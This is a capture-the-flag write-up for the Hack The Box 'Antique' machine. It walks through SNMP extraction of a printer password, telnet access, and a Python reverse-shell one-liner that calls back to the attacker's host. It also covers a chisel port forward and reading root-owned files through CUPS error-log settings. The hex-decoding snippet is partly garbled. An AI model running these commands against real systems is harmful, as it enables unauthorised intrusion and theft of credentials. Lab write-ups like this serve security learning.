---
title: Antique Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration

We see that the TCP scan reports port 23 (telnet) open.

With UDP we find port 161

## User exploit

We are going to append a `snmpbulkwalk` but it only shows us: `iso.3.6.1.2.1 = STRING: "HTB Printer"` This way, we know that we are dealing with a printer network exploit, which has a predefined exploit that allows us to hack the password: 
```shell
snmpwalk -v 2c -c public <IP> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

Using python together with the `import binascii` library we can decode the password:

```python
import binascii
s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30
31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103
106 111 114 115 11 9 122 123 126 130 131 134 135'
binascii.unhexlify(s.replace(' ',''))
```

And we get `P@ssw0rd@123!!123` which we are going to use to connect via telnet.

doing `exec id` we see that we are part of the lpadmin group, so we can manipulate the printers and pending jobs of other users. Therefore, we are going to send a reverse shell to our local machine:

```shell
exec python3 -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((("<IP>",<PORT>));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## Root exploit 

Doing `netstat -ant` we see port 631 open, so we are going to use chisel to do a LPF.

Once we start chisel on our local machine, let's pass it to the victim and run the following command:

```shell
./chisel client 10.10.14.73:8000 R:631:127.0.0.1:631
```

In this way, the port 631 of the victim will be ours now. We see that we are in front of CUPS 1.6.1 which is vulenarble to root file read. Therefore, we go to Administration > View Error Log. Usually, this service (CUPS server) runs as root by default, we can do an arbitrary file read.

To do this, we will use `cupsctl` as follows: `cupsctl ErrorLog="/root/root.txt"`.

Finally, we do a curl to `http://localhost:631/admin/log/error_log?` and we can see the root flag.`

